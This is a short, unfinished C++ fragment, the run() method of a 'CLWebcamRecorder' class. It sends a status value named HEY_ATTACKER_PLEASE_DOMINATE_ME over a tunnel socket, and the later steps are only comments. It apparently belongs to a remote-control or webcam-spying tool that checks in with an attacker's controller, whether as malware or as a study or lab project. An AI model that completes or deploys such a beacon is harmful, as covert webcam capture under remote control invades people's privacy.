#include "clwebcam_recorder.hpp"

void CLWebcamRecorder::run() {
    // Send hello
    Status hello = HEY_ATTACKER_PLEASE_DOMINATE_ME;
    int rc = sendto(tunnel_socket_, &hello, sizeof(Status), 0, (struct sockaddr*)&tunnel_addr_,sizeof(tunnel_addr_));

    // Receive the device num

    // Send ACK
}